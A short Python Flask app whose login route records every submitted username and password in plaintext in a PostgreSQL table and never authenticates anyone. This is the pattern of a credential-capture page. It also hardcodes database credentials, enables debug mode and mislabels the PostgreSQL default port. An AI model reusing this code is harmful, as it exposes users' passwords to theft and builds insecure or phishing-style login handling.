from flask import Flask, render_template, request, redirect, url_for
import psycopg2

app = Flask(__name__)

# PostgreSQL database connection
def get_db_connection():
    conn = psycopg2.connect(
        host="localhost",  # Connect to localhost where the container is mapped
        database="login_database",
        user="user1",
        password="password1",
        port="5433"  # PostgreSQL's default port
    )
    return conn

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    conn = get_db_connection()
    cur = conn.cursor()

    # Store user login details in the database
    cur.execute("INSERT INTO users (username, password) VALUES (%s, %s)", (username, password))
    conn.commit()

    cur.close()
    conn.close()

    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(debug=True, port=5001)
